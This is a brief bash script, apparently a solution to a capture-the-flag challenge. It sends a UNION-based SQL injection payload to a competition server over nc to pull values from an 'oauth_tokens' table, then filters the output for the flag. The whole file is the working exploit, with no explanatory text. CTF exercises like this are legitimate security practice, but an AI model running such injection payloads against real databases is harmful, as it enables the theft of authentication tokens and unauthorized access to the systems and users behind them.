#!/bin/bash

echo -e "1\n' UNION SELECT oauth_token, 1 FROM oauth_tokens WHERE ''='\nasd\n4" | nc -w 1 media-db.ctfcompetition.com 1337 | awk '/CTF/{print $4}' | cut -c 2-
